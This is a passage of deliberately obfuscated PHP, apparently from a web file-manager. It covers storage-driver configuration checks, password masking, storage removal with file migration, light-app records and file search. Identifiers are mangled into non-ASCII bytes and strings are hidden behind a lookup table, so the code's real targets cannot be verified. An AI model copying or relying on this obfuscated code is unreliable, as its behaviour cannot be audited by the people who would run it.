$òÒ¦æú¼ =& $_SERVER[è¶³ÒßÑ]; if (!$ËÀğşÉş) { return; } $İ•¦ßÃÒ = Model($òÒ¦æú¼[802])->config(); if ($İ•¦ßÃÒ[$òÒ¦æú¼[1731]] != $òÒ¦æú¼[101] || $İ•¦ßÃÒ[$òÒ¦æú¼[806]] != $ËÀğşÉş) { return; } $Ä°¯Á«Ê = Model($òÒ¦æú¼[824])->get($òÒ¦æú¼[837]); $Ä°¯Á«Ê = json_decode($Ä°¯Á«Ê, !0); if (!$Ä°¯Á«Ê) { return; } $Ä°¯Á«Ê[$òÒ¦æú¼[806]] = $·ıßŒ‰÷; Model($òÒ¦æú¼[824])->set(array($òÒ¦æú¼[837] => $Ä°¯Á«Ê)); } public function checkPwd($úåÈı¼, &$÷êõïÙ®) { $Õ¡­ÄÂŒ =& $_SERVER[è¶³ÒßÑ]; if (empty($÷êõïÙ®[$Õ¡­ÄÂŒ[6]])) { return; } $çÅÄáÅ  = json_decode($÷êõïÙ®[$Õ¡­ÄÂŒ[6]], !0); $ÙÙ™Íª = $Õ¡­ÄÂŒ[12]; $¯úòÀŒß = array($Õ¡­ÄÂŒ[2289], $Õ¡­ÄÂŒ[2290], $Õ¡­ÄÂŒ[942]); foreach ($¯úòÀŒß as $³éˆË€Õ) { if (isset($çÅÄáÅ [$³éˆË€Õ])) { $ÙÙ™Íª = $³éˆË€Õ; break; } } if (!$ÙÙ™Íª) { return; } $‚¼ÚÇé½ = $this->getConfig($úåÈı¼); $¶ÄƒÓÜ¥ = $‚¼ÚÇé½[$ÙÙ™Íª]; $¿”†Ìãõ = $çÅÄáÅ [$ÙÙ™Íª]; if ($¿”†Ìãõ == str_repeat($Õ¡­ÄÂŒ[230], strlen($¶ÄƒÓÜ¥))) { $çÅÄáÅ [$ÙÙ™Íª] = $¶ÄƒÓÜ¥; $÷êõïÙ®[$Õ¡­ÄÂŒ[6]] = json_encode($çÅÄáÅ ); } else { if ($¿”†Ìãõ != $¶ÄƒÓÜ¥) { $÷êõïÙ®[$Õ¡­ÄÂŒ[2288]] = $Õ¡­ÄÂŒ[101]; } } } public function checkConfig(&$¾÷° õ, $¡ƒ­¤õ = false) { $­Ö¯´¼È =& $_SERVER[è¶³ÒßÑ]; $£Ñ¬È¨É = strtolower($¾÷° õ[$­Ö¯´¼È[108]]); $ø—½ş®Ï = json_decode($¾÷° õ[$­Ö¯´¼È[6]], !0); foreach ($ø—½ş®Ï as $„Ğ§ĞµÈ => $»Å×¾ìí) { if (is_string($»Å×¾ìí)) { $ø—½ş®Ï[$„Ğ§ĞµÈ] = trim($»Å×¾ìí); } } $ø—½ş®Ï[$­Ö¯´¼È[2291]] = rand_string(6); $Û³ÎŸÆ» = $GLOBALS[$­Ö¯´¼È[6]][$­Ö¯´¼È[102]][$­Ö¯´¼È[879]]; $½õ‹Êôü = isset($Û³ÎŸÆ»[$£Ñ¬È¨É]) ? $Û³ÎŸÆ»[$£Ñ¬È¨É] : ucfirst($£Ñ¬È¨É); $·À½±×Š = $­Ö¯´¼È[87] . $½õ‹Êôü; if (!$½õ‹Êôü || !class_exists($·À½±×Š)) { if ($¡ƒ­¤õ) { return LNG($­Ö¯´¼È[2292]); } write_log(array($­Ö¯´¼È[2293], $¾÷° õ, get_caller_info()), $­Ö¯´¼È[225]); show_json(LNG($­Ö¯´¼È[2292]), !1, $¾÷° õ); } $¶¼éæ›Ğ = new $·À½±×Š($ø—½ş®Ï); if (in_array($£Ñ¬È¨É, $¶¼éæ›Ğ->objectDriver)) { try { if (!$¶¼éæ›Ğ->isBucketCors() && !$¶¼éæ›Ğ->setBucketCors()) { $’îÖâÌÜ = LNG($­Ö¯´¼È[2294]); $’îÖâÌÜ .= $­Ö¯´¼È[2295] . LNG($­Ö¯´¼È[2296]); } } catch (Exception $¾ğ”Äê) { $’îÖâÌÜ = $¾ğ”Äê->getMessage(); } if (isset($’îÖâÌÜ)) { return $this->_parseError($’îÖâÌÜ, $£Ñ¬È¨É, $¡ƒ­¤õ); } if ($£Ñ¬È¨É == $­Ö¯´¼È[78] && !$¶¼éæ›Ğ->checkRegion()) { return $this->_parseError(LNG($­Ö¯´¼È[2297]), $£Ñ¬È¨É, $¡ƒ­¤õ); } } $â†¨­İÂ = rtrim($ø—½ş®Ï[$­Ö¯´¼È[1237]], $­Ö¯´¼È[8]) . $­Ö¯´¼È[8]; $Ïİ—â„ = $¶¼éæ›Ğ->getPath($â†¨­İÂ . $­Ö¯´¼È[1241]); try { if ($£Ñ¬È¨É == $­Ö¯´¼È[119]) { $¶¼éæ›Ğ->mkdir($â†¨­İÂ); } $õæƒ¦æ— = $¶¼éæ›Ğ->mkfile($Ïİ—â„); if (!$õæƒ¦æ—) { $’îÖâÌÜ = LNG($­Ö¯´¼È[2294]); } } catch (Exception $¾ğ”Äê) { $’îÖâÌÜ = $¾ğ”Äê->getMessage(); } if (isset($’îÖâÌÜ)) { return $this->_parseError($’îÖâÌÜ, $£Ñ¬È¨É, $¡ƒ­¤õ); } $ø—½ş®Ï[$­Ö¯´¼È[1237]] = $â†¨­İÂ; $¾÷° õ[$­Ö¯´¼È[6]] = json_encode($ø—½ş®Ï); $¾÷° õ[$­Ö¯´¼È[108]] = $½õ‹Êôü; return !0; } private function _parseError($–Ø—êä±, $÷Óì±±Û, $€İù©âİ = false) { $¥ı¾Ğ„à =& $_SERVER[è¶³ÒßÑ]; if ($÷Óì±±Û == $¥ı¾Ğ„à[78] && stripos($–Ø—êä±, $¥ı¾Ğ„à[2298])) { $­»ŠÑ‘ = explode($¥ı¾Ğ„à[10], $–Ø—êä±); $Á¹¢ÀÍÒ = isset($­»ŠÑ‘[1]) ? $­»ŠÑ‘[1] : $¥ı¾Ğ„à[12]; $µˆÆ¿“Ò = array($¥ı¾Ğ„à[2299] => LNG($¥ı¾Ğ„à[2300]), $¥ı¾Ğ„à[2301] => LNG($¥ı¾Ğ„à[2302])); if (isset($µˆÆ¿“Ò[$Á¹¢ÀÍÒ])) { $–Ø—êä± = $µˆÆ¿“Ò[$Á¹¢ÀÍÒ]; } } if (stripos($–Ø—êä±, $¥ı¾Ğ„à[2303]) === 0) { $ä€ëË‡ = strpos($–Ø—êä±, $¥ı¾Ğ„à[188]); if ($ä€ëË‡ === !1) { $ä€ëË‡ = strpos($–Ø—êä±, $¥ı¾Ğ„à[4]); } if ($ä€ëË‡ !== !1) { $–Ø—êä± = substr($–Ø—êä±, $ä€ëË‡ + 1); } } $–Ø—êä± = LNG($¥ı¾Ğ„à[1244]) . $–Ø—êä±; if ($€İù©âİ) { return $–Ø—êä±; } show_json($–Ø—êä±, !1); } public function driverListSystem() { $Ò‰ïÜ¹¾ =& $_SERVER[è¶³ÒßÑ]; $öÈÕ†… = parent::listData(); $¡ÕÒ®ŞÅ = array(); foreach ($öÈÕ†… as $Ó³ûı‹Œ) { unset($Ó³ûı‹Œ[$Ò‰ïÜ¹¾[241]], $Ó³ûı‹Œ[$Ò‰ïÜ¹¾[98]]); $Ó³ûı‹Œ[$Ò‰ïÜ¹¾[6]] = json_decode($Ó³ûı‹Œ[$Ò‰ïÜ¹¾[6]], !0); $¡ÕÒ®ŞÅ[] = $Ó³ûı‹Œ; } return $¡ÕÒ®ŞÅ; } public function defaultDriver() { $Îåºãé =& $_SERVER[è¶³ÒßÑ]; $Ñµ´á¡å = parent::listData(); $ŸÅ‡Îû† = array_filter_by_field($Ñµ´á¡å, $Îåºãé[37], 1); $ŸÅ‡Îû† = $ŸÅ‡Îû†[0]; if ($ŸÅ‡Îû†) { $ŸÅ‡Îû†[$Îåºãé[6]] = json_decode($ŸÅ‡Îû†[$Îåºãé[6]], !0); } return $ŸÅ‡Îû†; } public function driverInfo($š·¾õƒì) { $‹–­ÁÜÈ =& $_SERVER[è¶³ÒßÑ]; $ÎªÑ÷¨ì = array_to_keyvalue(parent::listData(), $‹–­ÁÜÈ[468]); if (!isset($ÎªÑ÷¨ì[$š·¾õƒì])) { return !1; } $˜è¶¨¯Â = $ÎªÑ÷¨ì[$š·¾õƒì]; $˜è¶¨¯Â[$‹–­ÁÜÈ[6]] = json_decode($˜è¶¨¯Â[$‹–­ÁÜÈ[6]], !0); return $˜è¶¨¯Â; } public function remove($ß–ËÈçì) { $this->removeShareItems($ß–ËÈçì); return parent::remove($ß–ËÈçì); } public function removeWithFile($ïÄ±ÆéÙ, $É¶Ä©ä«, $ÒğéÏÙˆ, $±Û‹Àµ‘ = false) { $¯¼õúå£ =& $_SERVER[è¶³ÒßÑ]; $ÅûÄáœÎ = array($¯¼õúå£[871] => $ïÄ±ÆéÙ); $¢òéÑ‘ = Model($¯¼õúå£[537])->where($ÅûÄáœÎ)->count(); $¿ß¡¦Ï = Model($¯¼õúå£[537])->where($ÅûÄáœÎ)->sum($¯¼õúå£[89]); $Ø¢³Â†¶ = $É¶Ä©ä« . $¯¼õúå£[2304] . $ïÄ±ÆéÙ; $ó•„Æ… = LNG($É¶Ä©ä« == $¯¼õúå£[613] ? $¯¼õúå£[2305] : $¯¼õúå£[2306]); $Ã¡Üºâ­ = new TaskFileTransfer($Ø¢³Â†¶, $¯¼õúå£[225], $¢òéÑ‘, $ó•„Æ… . $¯¼õúå£[455] . $ÒğéÏÙˆ[$¯¼õúå£[32]] . $¯¼õúå£[224] . $ïÄ±ÆéÙ); $Ã¡Üºâ­->task[$¯¼õúå£[817]] = (double) $¿ß¡¦Ï; $Ş¿æœ‡ = KodIO::defaultDriver(); $İ…úØÓ = $Ş¿æœ‡[$¯¼õúå£[468]]; $¡şùñ™Ú = $ë½ƒö»º = $Â²ŸÔ”Ò = array(); $òáÀãâÏ = Model($¯¼õúå£[240])->where($ÅûÄáœÎ)->field($¯¼õúå£[2307])->select(); foreach ($òáÀãâÏ as $§ùˆŠƒÄ) { $Õ¡ÍâµÅ = $§ùˆŠƒÄ[$¯¼õúå£[534]]; if ($±Û‹Àµ‘) { $ë½ƒö»º[] = $Õ¡ÍâµÅ; continue; } $‰©àµØî = $§ùˆŠƒÄ[$¯¼õúå£[97]]; $Í´ûİßî = get_path_father($‰©àµØî); $Â²ŸÔ”Ò[] = $Í´ûİßî; $Í´ûİßî = str_replace("\173\151\157\72{$ïÄ±ÆéÙ}\x7d\x2f", "\173\151\x6f\72{$İ…úØÓ}\x7d\x2f", $Í´ûİßî); if (!IO::exist($‰©àµØî)) { $¡şùñ™Ú[] = $Õ¡ÍâµÅ; $Ã¡Üºâ­->updateFileEnd($§ùˆŠƒÄ[$¯¼õúå£[32]], $§ùˆŠƒÄ[$¯¼õúå£[89]]); write_log($¯¼õúå£[2308] . $‰©àµØî, $¯¼õúå£[1891]); continue; } $ûÎ¹ÚŸç = IO::move($‰©àµØî, $Í´ûİßî, REPEAT_RENAME); if (!$ûÎ¹ÚŸç) { $ë½ƒö»º[] = $Õ¡ÍâµÅ; $Ã¡Üºâ­->updateFileEnd($§ùˆŠƒÄ[$¯¼õúå£[32]], $§ùˆŠƒÄ[$¯¼õúå£[89]]); write_log($¯¼õúå£[2309] . $‰©àµØî, $¯¼õúå£[1891]); continue; } $ÅûÄáœÎ = array($¯¼õúå£[534] => $Õ¡ÍâµÅ); $†¯Û–Ã = array($¯¼õúå£[871] => $İ…úØÓ, $¯¼õúå£[97] => $ûÎ¹ÚŸç); Model($¯¼õúå£[240])->where($ÅûÄáœÎ)->save($†¯Û–Ã); } $áôÙÔŞ¯ = $Ã¡Üºâ­->task; if (!$±Û‹Àµ‘) { Cache::set($Ø¢³Â†¶, $áôÙÔŞ¯); } $Ã¡Üºâ­->end(); $¡şùñ™Ú = array_unique($¡şùñ™Ú); $ë½ƒö»º = array_unique($ë½ƒö»º); if (!$±Û‹Àµ‘ && ($¡şùñ™Ú || $ë½ƒö»º)) { $¶—­É„ó = array(); if ($¡şùñ™Ú) { $¶—­É„ó[] = sprintf(LNG($¯¼õúå£[2310]), count($¡şùñ™Ú)); } if ($ë½ƒö»º) { $¶—­É„ó[] = sprintf(LNG($¯¼õúå£[2311]), count($ë½ƒö»º)); } $¶—­É„ó = sprintf(LNG($¯¼õúå£[2312]), implode($¯¼õúå£[2313], $¶—­É„ó)) . $¯¼õúå£[2314] . date($¯¼õúå£[2315]) . $¯¼õúå£[2316]; if ($É¶Ä©ä« == $¯¼õúå£[1928]) { $¶—­É„ó .= $¯¼õúå£[2317] . LNG($¯¼õúå£[2318]); } $áôÙÔŞ¯[$¯¼õúå£[1239]] = $¶—­É„ó; Cache::set($Ø¢³Â†¶, $áôÙÔŞ¯); unset($ÒğéÏÙˆ[$¯¼õúå£[6]]); $¼æ·Úñ“ = array($¯¼õúå£[468] => $ïÄ±ÆéÙ, $¯¼õúå£[2197] => $¯¼õúå£[613], $¯¼õúå£[32] => $ÒğéÏÙˆ[$¯¼õúå£[32]], $¯¼õúå£[1262] => $ÒğéÏÙˆ); Hook::trigger($¯¼õúå£[1772], array($¯¼õúå£[1262] => $¼æ·Úñ“, $¯¼õúå£[1272] => !0)); show_json($¶—­É„ó, !1, 100111); } if ($É¶Ä©ä« == $¯¼õúå£[613]) { return !0; } if ($¡şùñ™Ú || $ë½ƒö»º) { $…§ªù¨ = array_merge($¡şùñ™Ú, $ë½ƒö»º); $…§ªù¨ = array_filter(array_unique($…§ªù¨)); $this->removeByFileID($…§ªù¨); } if ($Â²ŸÔ”Ò) { $Â²ŸÔ”Ò = array_filter(array_unique($Â²ŸÔ”Ò)); foreach ($Â²ŸÔ”Ò as $‰©àµØî) { $†±ìÉ”ƒ = IO::has($‰©àµØî, !0); if (!$†±ìÉ”ƒ[$¯¼õúå£[249]] && !$†±ìÉ”ƒ[$¯¼õúå£[250]]) { IO::remove($‰©àµØî); } } } return $this->remove($ïÄ±ÆéÙ); } private function removeByFileID($¤´­Ü½ = array()) { $öÍ ¹àá =& $_SERVER[è¶³ÒßÑ]; if (empty($¤´­Ü½)) { return; } $ÊŸù÷øŒ = array($öÍ ¹àá[534] => array($öÍ ¹àá[7], $¤´­Ü½)); $şÓÆ— = Model($öÍ ¹àá[1395])->where($ÊŸù÷øŒ)->field($öÍ ¹àá[203])->select(); if (!$şÓÆ—) { return Model($öÍ ¹àá[537])->remove($¤´­Ü½); } $şÓÆ— = array_to_keyvalue($şÓÆ—, $öÍ ¹àá[12], $öÍ ¹àá[203]); foreach ($şÓÆ— as $Àª¢¹»Ø) { Model($öÍ ¹àá[878])->removeNow($Àª¢¹»Ø, !1); } } private function removeShareItems($ŞÙ’ï) { $Èùúåâ» =& $_SERVER[è¶³ÒßÑ]; $çø¸½êÜ = "\173\x69\x6f\x3a{$ŞÙ’ï}\x7d\57"; $™‘¸‚±ˆ = array($Èùúåâ»[203] => 0, $Èùúåâ»[1232] => array($Èùúåâ»[452], "{$çø¸½êÜ}\45")); $ØùÒ´—‡ = Model($Èùúåâ»[1939])->where($™‘¸‚±ˆ)->field($Èùúåâ»[658])->select(); if (empty($ØùÒ´—‡)) { return; } $˜È„¯¦Œ = array_to_keyvalue($ØùÒ´—‡, $Èùúåâ»[12], $Èùúåâ»[658]); Model($Èùúåâ»[657])->remove($˜È„¯¦Œ); } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\x65\x6d\x2e\x4c\x69\147\x68\x74\x41\x70\x70"; public $modelType = "\x53\171\163\164\x65\x6d\117\160\x74\x69\x6f\156"; public $field = array("\156\141\155\145", "\147\x72\x6f\165\x70", "\144\145\x73\x63", "\x63\157\156\x74\145\156\164"); public function listData($ ş¯…ù° = false, $•äÍ§ŒŒ = "\155\157\144\151\146\171\x54\151\155\145", $Õ¯¢ãµ = true) { return parent::listData($ ş¯…ù°, $•äÍ§ŒŒ, $Õ¯¢ãµ); } public function remove($¨İÎˆÇ…) { $¾½ÖÈĞ = $this->findByName($¨İÎˆÇ…); if (!$¾½ÖÈĞ) { return !1; } return parent::remove($¾½ÖÈĞ[$_SERVER[è¶³ÒßÑ][468]]); } public function add($è€–…•Å) { if ($this->findByName($è€–…•Å[$_SERVER[è¶³ÒßÑ][32]])) { return !1; } return parent::insert($è€–…•Å); } public function update($ü¦Àò›¼, $Ò¢¸†) { $øéˆÊù½ =& $_SERVER[è¶³ÒßÑ]; $·ëÓ¸Çú = $this->findByName($ü¦Àò›¼); $Ù¿²¬° = $this->findByName($Ò¢¸†[$øéˆÊù½[32]]); if (!$·ëÓ¸Çú || $Ù¿²¬° && $Ù¿²¬°[$øéˆÊù½[468]] != $·ëÓ¸Çú[$øéˆÊù½[468]]) { return !1; } return parent::update($·ëÓ¸Çú[$øéˆÊù½[468]], $Ò¢¸†); } } goto F ¼¡ èù“; Aóè÷İ–ñ¯: class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($˜€™œë) { $©áÓÍ„ =& $_SERVER[è¶³ÒßÑ]; $¸à¾É¬° = KodIO::fileTypeList(); $¥‡‡íÍÏ = $¸à¾É¬°[$˜€™œë]; if (!$¥‡‡íÍÏ) { return array(); } $Ÿû÷ËÔÇ = $¥‡‡íÍÏ[$©áÓÍ„[179]]; $½ÒÂ¸¸ = $©áÓÍ„[7]; if (!$¥‡‡íÍÏ[$©áÓÍ„[179]]) { $¢õ¶ô = array_to_keyvalue($¸à¾É¬°, $©áÓÍ„[12], $©áÓÍ„[179]); $Ÿû÷ËÔÇ = implode($©áÓÍ„[50], $¢õ¶ô); $½ÒÂ¸¸ = $©áÓÍ„[2221]; } $Ñä²Ç¯å = explode($©áÓÍ„[50], trim($Ÿû÷ËÔÇ, $©áÓÍ„[50])); return array($½ÒÂ¸¸, $Ñä²Ç¯å); } public function listPathType($úœÚ•Ö) { $¯Ô¢Ãšù =& $_SERVER[è¶³ÒßÑ]; $šş‘ß˜÷ = $this->fileTypeWhere($úœÚ•Ö); if (!$šş‘ß˜÷) { return array(); } $¢ºùùÊ“ = USER_ID; $Î¾¨‰† = Model($¯Ô¢Ãšù[591])->getInfo($¢ºùùÊ“); $Ë…ƒÜÂ· = array($¯Ô¢Ãšù[641] => SourceModel::TYPE_USER, $¯Ô¢Ãšù[577] => array($¯Ô¢Ãšù[605], $¯Ô¢Ãšù[587] . $Î¾¨‰†[$¯Ô¢Ãšù[100]][$¯Ô¢Ãšù[203]] . $¯Ô¢Ãšù[606]), $¯Ô¢Ãšù[642] => $¢ºùùÊ“, $¯Ô¢Ãšù[639] => 0, $¯Ô¢Ãšù[640] => $šş‘ß˜÷); return $this->listSource($Ë…ƒÜÂ·); } public function listSearch($Äåù•àÍ, $èğÕäğØ = 300) { $Ûë–¯ğÅ =& $_SERVER[è¶³ÒßÑ]; if (isset($Äåù•àÍ[$Ûë–¯ğÅ[2057]]) && $Äåù•àÍ[$Ûë–¯ğÅ[2057]]) { $Äåù•àÍ[$Ûë–¯ğÅ[2057]] = str_replace($Ûë–¯ğÅ[453], $Ûë–¯ğÅ[2222], trim($Äåù•àÍ[$Ûë–¯ğÅ[2057]])); } $”ÂïèÅ = $this->_parseSearchWhere($Äåù•àÍ); if (!isset($”ÂïèÅ[$Ûë–¯ğÅ[498]])) { $”ÂïèÅ[$Ûë–¯ğÅ[498]] = 0; } $óŒªéÜ‹ = $Ûë–¯ğÅ[2223]; $ğÂÓ’ë = $”ÂïèÅ; $Å¢ØœêÊ = $óŒªéÜ‹; $this->_listSearchBindPinyin($Äåù•àÍ, $”ÂïèÅ, $óŒªéÜ‹); $this->alias($Ûë–¯ğÅ[512])->_makeOrder(); $”ÂïèÅ = $this->parseWhereLike($”ÂïèÅ); $Íñ¨Š£Ò = $this->distinct(!0)->field($óŒªéÜ‹)->where($”ÂïèÅ)->selectPage($èğÕäğØ); if ($GLOBALS[$Ûë–¯ğÅ[6]][$Ûë–¯ğÅ[450]][$Ûë–¯ğÅ[451]] && Input::check($Äåù•àÍ[$Ûë–¯ğÅ[2057]], $Ûë–¯ğÅ[648]) && $Íñ¨Š£Ò[$Ûë–¯ğÅ[435]][$Ûë–¯ğÅ[422]] == 1 && $Íñ¨Š£Ò[$Ûë–¯ğÅ[435]][$Ûë–¯ğÅ[436]] == 0) { $Íñ¨Š£Ò = $this->distinct(!0)->field($óŒªéÜ‹)->where($ğÂÓ’ë)->limit(1000)->select(); $Íñ¨Š£Ò = array_page_split($Íñ¨Š£Ò, !1, $èğÕäğØ); } $this->_listSearchFileContent($Íñ¨Š£Ò, $Äåù•àÍ, $Å¢ØœêÊ, $ğÂÓ’ë); $this->_listSearchDesc($Íñ¨Š£Ò, $Äåù•àÍ, $Å¢ØœêÊ); $this->_listSearchTag($Íñ¨Š£Ò, $Äåù•àÍ, $Å¢ØœêÊ); $this->_listSearchGroupTag($Íñ¨Š£Ò, $Äåù•àÍ, $Å¢ØœêÊ); $this->_listDataApply($Íñ¨Š£Ò[$Ûë–¯ğÅ[438]]); $this->_listMake($Íñ¨Š£Ò); return $Íñ¨Š£Ò; } private function _listSearchFileContent(&$³ºãˆĞ, $Ş©êÜ»Œ, $‘¢Í‘¿å, $Õü‹…Æ·) { $±àî‹Š­ =& $_SERVER[è¶³ÒßÑ]; if (!$Ş©êÜ»Œ[$±àî‹Š­[2057]] || $³ºãˆĞ[$±àî‹Š­[435]][$±àî‹Š­[422]] > 1) { return; } if (!isset($Õü‹…Æ·[$±àî‹Š­[32]]) || !is_array($Ş©êÜ»Œ[$±àî‹Š­[534]])) { return; } $Õü‹…Æ·[$±àî‹Š­[534]] = array($±àî‹Š­[7], $Ş©êÜ»Œ[$±àî‹Š­[534]]); unset($Õü‹…Æ·[$±àî‹Š­[32]]); unset($Ş©êÜ»Œ[$±àî‹Š­[534]]); $§µ åæÄ = $this->field($‘¢Í‘¿å)->where($Õü‹…Æ·)->limit($±àî‹Š­[2224])->select(); if (!$§µ åæÄ || count($§µ åæÄ) == 0) { return; } $³ºãˆĞ[$±àî‹Š­[438]] = array_merge($§µ åæÄ, $³ºãˆĞ[$±àî‹Š­[438]]); $³ºãˆĞ[$±àî‹Š­[435]][$±àî‹Š­[436]] += count($§µ åæÄ); } private function _listSearchTag(&$ÁÒê¯Ô, $Ôİ˜şñğ, $ŸÄÕ¿Ã¤) { $÷üÀø‰µ =& $_SERVER[è¶³ÒßÑ]; if (!$Ôİ˜şñğ[$÷üÀø‰µ[2057]] || $ÁÒê¯Ô[$÷üÀø‰µ[435]][$÷üÀø‰µ[422]] > 1) { return; } $‚ø¬¸€Ë = Model($÷üÀø‰µ[2225])->listData(); $´üÎ§İ = array(); $À„¬öê® = $Ôİ˜şñğ[$÷üÀø‰µ[2057]]; foreach ($‚ø¬¸€Ë as $çµí¡âÀ) { $ôÔæ–¡³ = $çµí¡âÀ[$÷üÀø‰µ[32]]; $ò®Êä¢• = str_replace($÷üÀø‰µ[53], $÷üÀø‰µ[12], Pinyin::get($ôÔæ–¡³)); if (stripos($ôÔæ–¡³, $À„¬öê®) !== !1 || stripos($ò®Êä¢•, $À„¬öê®) !== !1) { $´üÎ§İ[] = $çµí¡âÀ[$÷üÀø‰µ[468]]; } } if (!$´üÎ§İ) { return; } $¡‘“Ìä¤ = array($÷üÀø‰µ[493] => array($÷üÀø‰µ[7], $´üÎ§İ), $÷üÀø‰µ[1761] => USER_ID); $®Îö“½ = Model($÷üÀø‰µ[495])->field($÷üÀø‰µ[97])->where($¡‘“Ìä¤)->select(); $®Îö“½ = array_to_keyvalue($®Îö“½, $÷üÀø‰µ[12], $÷üÀø‰µ[97]); $ôŒã¼éÓ = array_unique($®Îö“½); $this->_listSearchMerge($ÁÒê¯Ô, $Ôİ˜şñğ, $ŸÄÕ¿Ã¤, $ôŒã¼éÓ); } private function _listSearchDesc(&$§Í‚‡Œ›, $¼»ÅƒË’, $Ú°•çÑ‚) { $Ú«¡Î‡£ =& $_SERVER[è¶³ÒßÑ]; if (!$¼»ÅƒË’[$Ú«¡Î‡£[2057]] || $§Í‚‡Œ›[$Ú«¡Î‡£[435]][$Ú«¡Î‡£[422]] > 1) { return; } $Ú‡‰ÛºÖ = array($Ú«¡Î‡£[107] => $Ú«¡Î‡£[519], $Ú«¡Î‡£[443] => array($Ú«¡Î‡£[452], $Ú«¡Î‡£[2059] . $¼»ÅƒË’[$Ú«¡Î‡£[2057]] . $Ú«¡Î‡£[2059])); $ùÜî…å = !1; if ($ùÜî…å) { $é×Œ†–Ï = $this->listSearchChildren($¼»ÅƒË’[$Ú«¡Î‡£[202]]); $é×Œ†–Ï = array_unique($é×Œ†–Ï); if (!$é×Œ†–Ï) { return; } $Ú‡‰ÛºÖ[$Ú«¡Î‡£[203]] = array($Ú«¡Î‡£[7], $é×Œ†–Ï); } $ã¸ÚõŸ• = Model($Ú«¡Î‡£[625])->field($Ú«¡Î‡£[203])->where($Ú‡‰ÛºÖ)->limit(5000)->select(); $–”Œ¹¼µ = array_to_keyvalue($ã¸ÚõŸ•, $Ú«¡Î‡£[12], $Ú«¡Î‡£[203]); $this->_listSearchMerge($§Í‚‡Œ›, $¼»ÅƒË’, $Ú°•çÑ‚, $–”Œ¹¼µ); } private function _listSearchGroupTag(&$•¶©÷¶ä, $Ö–Îı°Æ, $‰ìú§) { $Şø¼ó =& $_SERVER[è¶³ÒßÑ]; if (!$Ö–Îı°Æ[$Şø¼ó[2057]] || $•¶©÷¶ä[$Şø¼ó[435]][$Şø¼ó[422]] > 1 || !$Ö–Îı°Æ[$Şø¼ó[202]]) { return; } $¤ş¯Êıô = $this->sourceInfo($Ö–Îı°Æ[$Şø¼ó[202]]); if (!$¤ş¯Êıô || $¤ş¯Êıô[$Şø¼ó[200]] != SourceModel::TYPE_GROUP) { return; } $Ê¢Â¦ª÷ = $¤ş¯Êıô[$Şø¼ó[562]]; $íæÄæàÁ = Model($Şø¼ó[2226])->get($Ê¢Â¦ª÷); $ÅÜ…“¾œ = array(); $ô¥Û¢¤¢ = $Ö–Îı°Æ[$Şø¼ó[2057]]; foreach ($íæÄæàÁ[$Şø¼ó[438]] as $øèÆüİà) { $ãšÂìß² = $øèÆüİà[$Şø¼ó[32]]; $éŸµ¨‹— = str_replace($Şø¼ó[53], $Şø¼ó[12], Pinyin::get($ãšÂìß²)); if (stripos($ãšÂìß², $ô¥Û¢¤¢) !== !1 || stripos($éŸµ¨‹—, $ô¥Û¢¤¢) !== !1) { $ÅÜ…“¾œ[] = $øèÆüİà[$Şø¼ó[468]]; } } if (!$ÅÜ…“¾œ) { return; } $¥Ãæ‚›¾ = array($Şø¼ó[493] => array($Şø¼ó[7], $ÅÜ…“¾œ), $Şø¼ó[1761] => 0, $Şø¼ó[33] => $Şø¼ó[2079] . $Ê¢Â¦ª÷); $Ê·ßÄÉ = Model($Şø¼ó[495])->field($Şø¼ó[97])->where($¥Ãæ‚›¾)->select(); $Ê·ßÄÉ = array_to_keyvalue($Ê·ßÄÉ, $Şø¼ó[12], $Şø¼ó[97]); $„šÎÓ®¨ = array_unique($Ê·ßÄÉ); $this->_listSearchMerge($•¶©÷¶ä, $Ö–Îı°Æ, $‰ìú§, $„šÎÓ®¨); } private function _listSearchMerge(&$’ÊêÊ È, $æÖ¿ƒğè, $‡ÎæŒÚ, $ä¬½Î¶Ö) { $¸¾Ë®ê— =& $_SERVER[è¶³ÒßÑ]; if (!$ä¬½Î¶Ö) { return; } $¨Á—†ÒÂ = array_to_keyvalue($’ÊêÊ È[$¸¾Ë®ê—[438]], $¸¾Ë®ê—[12], $¸¾Ë®ê—[203]); $ó©ºü¹Ş = array_diff($ä¬½Î¶Ö, $¨Á—†ÒÂ); if (!$ó©ºü¹Ş) { return; } $™€şçÆ„ = array($¸¾Ë®ê—[203] => array($¸¾Ë®ê—[7], $ó©ºü¹Ş)); $»¤à‹Ë¸ = $this->field($‡ÎæŒÚ)->where($™€şçÆ„)->select(); if (!$»¤à‹Ë¸) { return; } $üà‹ƒ•£ = array(); foreach ($»¤à‹Ë¸ as $º»±îš) { if ($this->_listSearchFilter($º»±îš, $æÖ¿ƒğè)) { $üà‹ƒ•£[] = $º»±îš; } } $’ÊêÊ È[$¸¾Ë®ê—[438]] = array_merge($üà‹ƒ•£, $’ÊêÊ È[$¸¾Ë®ê—[438]]); $’ÊêÊ È[$¸¾Ë®ê—[435]][$¸¾Ë®ê—[436]] += count($üà‹ƒ•£); } private function _listSearchFilter($êÊÂÎ¾õ, $×Î²ÑÌÙ) { $ìêºÛ‚Ğ =& $_SERVER[è¶³ÒßÑ]; $¥à˜ÎÜ = $êÊÂÎ¾õ[$ìêºÛ‚Ğ[478]] == $ìêºÛ‚Ğ[101]; if (!strstr($êÊÂÎ¾õ[$ìêºÛ‚Ğ[577]], $ìêºÛ‚Ğ[50] . $×Î²ÑÌÙ[$ìêºÛ‚Ğ[202]] . $ìêºÛ‚Ğ[50])) { return !1; } if (isset($×Î²ÑÌÙ[$ìêºÛ‚Ğ[479]]) && $×Î²ÑÌÙ[$ìêºÛ‚Ğ[479]] != $ìêºÛ‚Ğ[830]) { if ($×Î²ÑÌÙ[$ìêºÛ‚Ğ[479]] == $ìêºÛ‚Ğ[88] && !$¥à˜ÎÜ) { return !1; } if ($×Î²ÑÌÙ[$ìêºÛ‚Ğ[479]] != $ìêºÛ‚Ğ[88] && $¥à˜ÎÜ) { return !1; } if (!strstr($êÊÂÎ¾õ[$ìêºÛ‚Ğ[179]], $ìêºÛ‚Ğ[50] . $×Î²ÑÌÙ[$ìêºÛ‚Ğ[479]] . $ìêºÛ‚Ğ[50])) { return !1; } } if (isset($×Î²ÑÌÙ[$ìêºÛ‚Ğ[2227]]) && $×Î²ÑÌÙ[$ìêºÛ‚Ğ[2227]] < $êÊÂÎ¾õ[$ìêºÛ‚Ğ[89]]) { return !1; } if (isset($×Î²ÑÌÙ[$ìêºÛ‚Ğ[2228]]) && $×Î²ÑÌÙ[$ìêºÛ‚Ğ[2228]] > 